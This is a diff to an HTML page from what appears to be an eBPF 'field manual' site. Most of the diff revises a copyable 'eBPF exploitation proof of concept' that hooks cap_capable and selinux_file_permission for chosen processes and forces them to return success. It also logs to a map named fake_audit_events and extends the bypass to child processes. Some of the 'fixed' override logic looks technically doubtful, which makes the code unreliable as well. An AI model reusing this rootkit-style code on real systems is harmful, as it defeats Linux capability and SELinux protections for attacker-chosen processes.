@@ -53,6 +53,13 @@
                 
                     
                     
+                    <a href="/dBPF/chapter-0-field-manual-preface.html" >
+                        Chapter 0: Field Manual Preface
+                    </a>
+                    
+                
+                    
+                    
                     <a href="/dBPF/the-mirror-controls.html" class="active">
                         The Mirror Controls
                     </a>
@@ -438,6 +445,23 @@ graph TD
 204
 205
 206
+207
+208
+209
+210
+211
+212
+213
+214
+215
+216
+217
+218
+219
+220
+221
+222
+223
 </pre></td><td class="rouge-code"><pre><span class="c1">// @interactive: true</span>
 <span class="c1">// @copyable: true</span>
 <span class="c1">// Real-world eBPF exploitation proof of concept (FIXED)</span>
@@ -521,11 +545,10 @@ graph TD
     <span class="k">return</span> <span class="p">(</span><span class="n">u32</span><span class="p">)(</span><span class="n">ts</span> <span class="o">^</span> <span class="n">pid</span><span class="p">);</span>
 <span class="p">}</span>
 
-<span class="c1">// FIX: Use `fentry` and `bpf_override_return` instead of kprobe for a functional bypass.</span>
-<span class="c1">// NOTE: This requires a Linux kernel version 5.10+</span>
-<span class="n">SEC</span><span class="p">(</span><span class="s">"fentry/cap_capable"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="nf">BPF_PROG</span><span class="p">(</span><span class="n">hook_cap_check</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">cred</span> <span class="o">*</span><span class="n">cred</span><span class="p">,</span> <span class="k">struct</span> <span class="n">user_namespace</span> <span class="o">*</span><span class="n">ns</span><span class="p">,</span>
-             <span class="kt">int</span> <span class="n">cap</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">opts</span><span class="p">)</span> <span class="p">{</span>
+<span class="c1">// FIXED: Use kprobe with proper return value modification</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/cap_capable"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_cap_check</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">cred</span> <span class="o">*</span><span class="n">cred</span><span class="p">,</span> <span class="k">struct</span> <span class="n">user_namespace</span> <span class="o">*</span><span class="n">ns</span><span class="p">,</span>
+               <span class="kt">int</span> <span class="n">cap</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">opts</span><span class="p">)</span> <span class="p">{</span>
     <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
     
     <span class="k">if</span> <span class="p">(</span><span class="n">is_target_process</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span> <span class="p">{</span>
@@ -540,24 +563,32 @@ graph TD
         <span class="n">bpf_get_current_comm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">));</span>
         <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fake_audit_events</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">audit_id</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
         <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">));</span>
-        
-        <span class="c1">// FIX: This is the correct way to bypass the security check.</span>
-        <span class="c1">// It forces `cap_capable` to return 0 (success) and skips the original function.</span>
-        <span class="k">return</span> <span class="n">bpf_override_return</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
     <span class="p">}</span>
     
-    <span class="c1">// Allow the original function to execute for all other processes.</span>
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="c1">// FIX: Use `fentry` and `bpf_override_return` for SELinux checks as well.</span>
-<span class="n">SEC</span><span class="p">(</span><span class="s">"fentry/selinux_file_permission"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="nf">BPF_PROG</span><span class="p">(</span><span class="n">hook_selinux</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">int</span> <span class="n">mask</span><span class="p">)</span> <span class="p">{</span>
+<span class="c1">// FIXED: Use kretprobe to modify return value</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"kretprobe/cap_capable"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_KRETPROBE</span><span class="p">(</span><span class="n">hook_cap_check_ret</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ret</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="n">is_target_process</span><span class="p">(</span><span class="n">pid</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">ret</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// Override the return value to allow the capability check</span>
+        <span class="n">bpf_override_return</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+    
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// FIXED: Use kprobe for SELinux checks</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/selinux_file_permission"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_selinux</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">int</span> <span class="n">mask</span><span class="p">)</span> <span class="p">{</span>
     <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
     
     <span class="k">if</span> <span class="p">(</span><span class="n">is_target_process</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span> <span class="p">{</span>
         <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>
-        <span class="n">bpf_probe_read_str</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">filename</span><span class="p">),</span> <span class="n">file</span><span class="o">-&gt;</span><span class="n">f_path</span><span class="p">.</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>
+        <span class="n">bpf_probe_read_kernel_str</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">filename</span><span class="p">),</span> <span class="n">file</span><span class="o">-&gt;</span><span class="n">f_path</span><span class="p">.</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>
         
         <span class="k">if</span> <span class="p">(</span><span class="n">is_target_file</span><span class="p">(</span><span class="n">filename</span><span class="p">))</span> <span class="p">{</span>
             <span class="k">struct</span> <span class="n">security_event</span> <span class="n">event</span> <span class="o">=</span> <span class="p">{</span>
@@ -572,13 +603,22 @@ graph TD
             
             <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fake_audit_events</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">audit_id</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
             <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">));</span>
-
-            <span class="c1">// FIX: Force the function to return 0 (success/allowed).</span>
-            <span class="k">return</span> <span class="n">bpf_override_return</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
         <span class="p">}</span>
     <span class="p">}</span>
     
-    <span class="c1">// Allow the original function to execute for other processes/files.</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// FIXED: Use kretprobe to modify SELinux return value</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"kretprobe/selinux_file_permission"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_KRETPROBE</span><span class="p">(</span><span class="n">hook_selinux_ret</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ret</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="n">is_target_process</span><span class="p">(</span><span class="n">pid</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">ret</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// Override the return value to allow the file access</span>
+        <span class="n">bpf_override_return</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+    
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 
@@ -623,22 +663,23 @@ graph TD
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="c1">// Add child processes of our target to our tracking map</span>
+<span class="c1">// FIXED: Add child processes of our target to our tracking map</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/wake_up_new_task"</span><span class="p">)</span>
 <span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_new_task</span><span class="p">,</span> <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task</span><span class="p">)</span> <span class="p">{</span>
-    <span class="c1">// FIX: Correctly get parent PID from the task_struct</span>
+    <span class="c1">// FIXED: Correctly get parent PID from the task_struct</span>
     <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">parent</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
     <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">parent</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">parent</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">task</span><span class="o">-&gt;</span><span class="n">real_parent</span><span class="p">);</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">parent</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">u32</span> <span class="n">parent_pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-        <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">parent_pid</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">parent_pid</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">parent</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">);</span>
+        <span class="n">pid_t</span> <span class="n">parent_pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">parent_pid</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">parent_pid</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">parent</span><span class="o">-&gt;</span><span class="n">tgid</span><span class="p">);</span>
 
-        <span class="k">if</span> <span class="p">(</span><span class="n">is_target_process</span><span class="p">(</span><span class="n">parent_pid</span><span class="p">))</span> <span class="p">{</span>
-            <span class="n">u32</span> <span class="n">child_pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-            <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">child_pid</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">child_pid</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">task</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">is_target_process</span><span class="p">((</span><span class="n">u32</span><span class="p">)</span><span class="n">parent_pid</span><span class="p">))</span> <span class="p">{</span>
+            <span class="n">pid_t</span> <span class="n">child_pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+            <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">child_pid</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">child_pid</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">task</span><span class="o">-&gt;</span><span class="n">tgid</span><span class="p">);</span>
             <span class="k">if</span> <span class="p">(</span><span class="n">child_pid</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                  <span class="n">u8</span> <span class="n">value</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-                 <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_processes</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">child_pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+                 <span class="n">u32</span> <span class="n">child_pid_u32</span> <span class="o">=</span> <span class="p">(</span><span class="n">u32</span><span class="p">)</span><span class="n">child_pid</span><span class="p">;</span>
+                 <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_processes</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">child_pid_u32</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
             <span class="p">}</span>
         <span class="p">}</span>
     <span class="p">}</span>
@@ -1004,6 +1045,14 @@ seccomp-bpf-filter.json:
                 
                 <nav class="post-nav">
                     <div class="post-nav-item prev">
+                        
+                        
+                        
+                        <span class="nav-label">Previous</span>
+                        <a href="/dBPF/chapter-0-field-manual-preface.html" class="prev">
+                            Chapter 0: Field Manual Preface
+                        </a>
+                        
                         
                     </div>
                     <div class="post-nav-item next">
